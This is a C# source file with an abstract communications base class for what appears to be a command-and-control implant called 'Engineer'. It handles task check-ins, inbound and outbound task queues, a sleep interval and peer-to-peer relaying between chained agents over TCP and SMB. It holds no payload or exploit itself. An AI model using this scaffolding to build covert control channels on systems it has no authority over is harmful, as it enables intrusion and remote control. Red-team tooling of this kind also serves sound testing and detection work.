using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Models
{
    public abstract class EngCommBase
	{
		public abstract Task Start();
		public abstract void Stop();

		public abstract Task CheckIn();

		public abstract Task PostData();

		internal ConcurrentQueue<EngineerTask> Inbound = new ConcurrentQueue<EngineerTask>();
		internal ConcurrentQueue<EngineerTaskResult> Outbound = new ConcurrentQueue<EngineerTaskResult>();
        internal ConcurrentQueue<byte[]> P2POutbound = new ConcurrentQueue<byte[]>();
        internal EngineerMetadata engineerMetadata;

        public bool IsChildConnectedToParent { get; set; } // only used from a child in TCP & SMB, is true if its parent is still connected, false if not, used to issue check-in commands.
        public static int Sleep { get; set;}
		internal IEnumerable<EngineerTaskResult> GetOutbound()
		{
			var outbound = new List<EngineerTaskResult>();
			while (Outbound.TryDequeue(out var task))
			{
				outbound.Add(task);
                Program.OutboundResponsesSent += 1;
            }
			return outbound;
		}

        internal byte[] GetP2POutbound()
        {
			P2POutbound.TryDequeue(out var tcpTaskData);
			return tcpTaskData;
        }

        public bool RecvData(out IEnumerable<EngineerTask> tasks)
		{
			if (Inbound.IsEmpty)
			{
				tasks = null;
                return false;
			}
			var list = new List<EngineerTask>();

			while (Inbound.TryDequeue(out var task))
			{
				list.Add(task);
                Program.InboundCommandsRec += 1;
            }

			tasks = list;
			//Console.WriteLine("dequeued task");
			return true;

		}

		public void SentData(EngineerTaskResult result)
		{
			Outbound.Enqueue(result);

		}

        public async Task P2PSent(byte[] tcpData)
		{
            P2POutbound.Enqueue(tcpData);
			Console.WriteLine($"{DateTime.Now} task response in queue size {tcpData.Length}");
        }

		public virtual void Init(EngineerMetadata engineermetadata)
		{
			engineerMetadata = engineermetadata;

		}
	}
}
